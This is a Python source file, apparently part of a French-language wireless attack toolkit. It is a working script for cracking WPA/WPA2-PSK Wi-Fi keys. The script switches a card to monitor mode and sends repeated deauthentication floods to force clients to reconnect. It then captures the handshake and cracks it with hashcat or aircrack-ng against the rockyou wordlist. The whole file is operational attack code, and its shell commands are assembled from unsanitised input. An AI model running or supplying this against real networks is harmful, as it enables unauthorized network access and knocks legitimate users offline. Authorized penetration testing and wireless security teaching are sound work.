
# app/attacks/wpa_cracker.py
import os
import re
import subprocess
import sys
import time

from app.config import (
    Colors, cprint, run, ask, list_interfaces, is_root, iface_exists,
    is_valid_mac, is_valid_channel, CAPTURES_DIR,
)

REQUIRED_TOOLS = [
    "airodump-ng", "aireplay-ng", "aircrack-ng", "iw",
    "hcxpcapngtool", "hashcat",
]


def check_tools():
    missing = [t for t in REQUIRED_TOOLS
               if subprocess.run(f"which {t}", shell=True,
                                 capture_output=True).returncode != 0]
    if missing:
        print(f"[-] Outils manquants : {', '.join(missing)}")
        print("[i] Lance : sudo /dependencies/install_deps_wpa_wep.sh")
        return False
    return True


def configure_monitor_mode(iface):
    print(f"[*] Passage de {iface} en mode monitor...")
    if run(f"iw dev {iface} info", capture=False) != 0:
        return False
    run(f"ip link set {iface} down", capture=False)
    if run(f"iw dev {iface} set type monitor", capture=False) != 0:
        return False
    run(f"ip link set {iface} up", capture=False)
    print(f"[+] {iface} est en mode monitor.")
    return True


def show_networks_wpa(iface):
    print(f"\n[*] Scan WPA sur {iface} (Ctrl+C pour arrêter)...")
    print("[i] Note BSSID et canal cible.\n")
    try:
        subprocess.run(f"airodump-ng --encrypt WPA {iface}", shell=True)
    except KeyboardInterrupt:
        pass


def _has_handshake(pcap):
    """Détecte un handshake via aircrack-ng (sortie texte)."""
    res = subprocess.run(f"aircrack-ng {pcap}",
                         shell=True, capture_output=True, text=True)
    return "1 handshake" in res.stdout or "WPA (1 handshake)" in res.stdout


def capture_handshake(bssid, channel, client_mac, iface, output_file):
    """Capture jusqu'à obtenir un handshake. Retourne le .cap ou None."""
    print(f"\n[*] Capture sur {bssid} (canal {channel})...")
    run(f"rm -f {output_file}-*", capture=False)
    run(f"airodump-ng --channel {channel} --bssid {bssid} "
        f"--write {output_file} {iface}", background=True)

    time.sleep(3)
    print("[*] Envoi de deauth pour forcer le handshake...")

    cap_file = None
    try:
        for i in range(60):  # ~3 minutes max
            time.sleep(3)
            if i % 5 == 0:
                target = f"-c {client_mac}" if client_mac else "--deauth 5"
                run(f"aireplay-ng --deauth 5 -a {bssid} {target} {iface}",
                    capture=False)

            for f in os.listdir("."):
                if f.startswith(output_file) and f.endswith(".cap"):
                    cap_file = f
                    break
            if cap_file and _has_handshake(cap_file):
                print("[+] Handshake capturé !")
                break
    except KeyboardInterrupt:
        print("\n[+] Interrompu.")
    run("pkill airodump-ng", capture=False)
    return cap_file


def convert_to_hc22000(pcap, out_prefix):
    """Convertit .cap → .hc22000 (hashcat mode 22000)."""
    out = os.path.join(CAPTURES_DIR, f"{out_prefix}.hc22000")
    print(f"[*] Conversion → {out}")
    if run(f"hcxpcapngtool -o {out} {pcap}", capture=False) != 0:
        print("[-] Conversion échouée.")
        return None
    return out if os.path.exists(out) else None


def crack_with_hashcat(hash_file, wordlist):
    print(f"\n[*] Hashcat -m 22000 sur {hash_file}")
    print(f"[i] Wordlist : {wordlist}")
    cmd = (f"hashcat -m 22000 -a 0 {hash_file} {wordlist} "
           f"--force --potfile-disable -O")
    if run(cmd, capture=False) != 0:
        print("[-] Hashcat a échoué (GPU/OpenCL ?).")
        return False
    print("[+] Hashcat terminé. Clé affichée ci-dessus.")
    return True


def crack_with_aircrack(pcap, wordlist):
    print(f"\n[*] Aircrack-ng sur {pcap} + {wordlist}")
    return subprocess.run(f"aircrack-ng -w {wordlist} {pcap}",
                          shell=True).returncode == 0


def main():
    if not is_root():
        cprint("[-] Root requis.", Colors.RED, bold=True)
        sys.exit(1)
    if not check_tools():
        sys.exit(1)

    cprint("Attaque WPA/WPA2-PSK", Colors.GREEN, bold=True)

    list_interfaces()
    iface = ask("Interface monitor", default="wlan1mon", validator=iface_exists)
    if not configure_monitor_mode(iface):
        sys.exit(1)

    show_networks_wpa(iface)

    bssid = ask("BSSID cible", validator=is_valid_mac)
    channel = ask("Canal (1-14)", validator=is_valid_channel)
    client = input("MAC client (vide = deauth broadcast) : ").strip() or None
    if client and not is_valid_mac(client):
        print("[-] MAC client invalide.")
        sys.exit(1)

    out = ask("Fichier capture", default="wpa_capture")
    cap = capture_handshake(bssid, int(channel), client, iface, out)
    if not cap:
        print("[-] Pas de handshake.")
        sys.exit(1)

    hash_file = convert_to_hc22000(cap, out)
    wordlist = ask("Wordlist", default="/usr/share/wordlists/rockyou.txt",
                   validator=os.path.exists)

    print("\nMéthode de cracking :")
    print("1. Hashcat (GPU, -m 22000)")
    print("2. Aircrack-ng (CPU)")
    choice = ask("[1/2]", default="1", validator=lambda x: x in ("1", "2"))

    if choice == "1" and hash_file:
        ok = crack_with_hashcat(hash_file, wordlist)
    else:
        ok = crack_with_aircrack(cap, wordlist)

    sys.exit(0 if ok else 1)


if __name__ == "__main__":
    main()